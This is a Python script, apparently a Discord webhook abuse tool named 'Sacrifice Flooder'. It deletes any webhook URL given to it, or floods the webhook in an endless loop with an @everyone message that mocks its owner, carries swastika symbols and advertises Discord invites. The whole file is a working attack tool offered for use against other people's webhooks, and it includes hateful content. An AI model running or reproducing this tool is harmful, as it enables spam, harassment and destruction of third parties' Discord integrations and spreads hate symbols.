import os
os.system("title 🩸Sacrifice Flooder🩸 ┃ Dev: swayed")
import dhooks
from dhooks import Webhook
import time
import requests, os
import colorama
from colorama import Back, Fore, Style
colorama.init()


os.system("cls")

def menu():
    print(f"""{Fore.MAGENTA}
.▄▄ ·  ▄▄▄·  ▄▄· ▄▄▄  ▪  ·▄▄▄▪   ▄▄· ▄▄▄ .
▐█ ▀. ▐█ ▀█ ▐█ ▌▪▀▄ █·██ ▐▄▄·██ ▐█ ▌▪▀▄.▀·
▄▀▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄ ▐█·██▪ ▐█·██ ▄▄▐▀▀▪▄
▐█▄▪▐█▐█ ▪▐▌▐███▌▐█•█▌▐█▌██▌.▐█▌▐███▌▐█▄▄▌
 ▀▀▀▀  ▀  ▀ ·▀▀▀ .▀  ▀▀▀▀▀▀▀ ▀▀▀·▀▀▀  ▀▀▀ 

> {Fore.CYAN}Created by: swayed (Prob New Tag Or Termed)
{Fore.MAGENTA}> {Fore.RED}https://solo.to/hott (<stay tuned)
""")
    print(f"{Fore.MAGENTA}╔═══════════════════╗\n║[1] Delete Webhook ║")
    print(f"{Fore.MAGENTA}║[2] Spam Webhook   ║")
    print(f"{Fore.MAGENTA}║[0] Quit           ║\n╚═══════════════════╝")


menu()
option = int(input(f"{Fore.CYAN}╔══{Fore.RED}[{Fore.MAGENTA}Choose your option{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\n╚══► "))

while option !=0:
    if option ==1:
        #Function For Option 1#
        webhook = input(f"{Fore.CYAN}╔══{Fore.RED}[{Fore.MAGENTA}Enter the webhook you want to delete{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\n╚══►: ")

        def delete():
            requests.delete(webhook)
            check = requests.get(webhook)
            if check.status_code == 404:
                print(f"\n {Fore.BLUE}[LOGS] {Fore.MAGENTA}Webhook {Fore.GREEN}succsesfully deleted")
                os.system("pause >nul")  # (any key to exit the code)
            elif check.status_code == 200:
                print(f"\n {Fore.BLUE}[LOGS] {Fore.RED}FAILED {Fore.MAGENTA}to delete the webhook")
                os.system("pause >nul")

        test = requests.get(webhook)
        if test.status_code == 404:
            print(f"\n {Fore.BLUE}[LOGS] {Fore.MAGENTA}Webhook is {Fore.RED}INVALID")
            os.system("pause >nul")
        elif test.status_code == 200:
            print(f"\n {Fore.BLUE}[LOGS] {Fore.MAGENTA}Webhook is {Fore.GREEN}VALID{Fore.MAGENTA}")
            delete()
    elif option ==2:
        #Function For Option 2#
        username = ("Sacrifice Flooder")
        webhookurl = Webhook(input(f"{Fore.CYAN}╔══{Fore.RED}[{Fore.MAGENTA}Enter webhook{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\n╚══► "))
        message = ("卐**------------------------------Watch Your Webhook Skid:skull:.------------------------------**卐\n||@everyone||hows your webhook?🤡\n||More Relevant /+ Updates: discord.gg/fys / https://dsc.gg/fys||\n卐**---------------------------------------------------------------------------------------------**卐")

        while True:
            time.sleep(0)
            webhookurl.send(message)
            print(f"{Fore.CYAN}╚══►{Fore.GREEN}Message Sent.")
            time.sleep(0)
            print(f"{Fore.CYAN}╔══{Fore.RED}[{Fore.MAGENTA}Hit{Fore.RED}]{Fore.MAGENTA}: {Fore.YELLOW}\"ctrl + c\" {Fore.MAGENTA}AT ANY TIME TO STOP!!")
    else:
        print(f"{Fore.RED}Invalid Option")
        
    print()
    menu()
    option = int(input(f"{Fore.CYAN}╔══{Fore.RED}[{Fore.MAGENTA}Choose your option{Fore.RED}]{Fore.MAGENTA}{Fore.CYAN}\n╚══► "))

print(f"{Fore.MAGENTA}Thx for using Sacrifice, Goodbye!")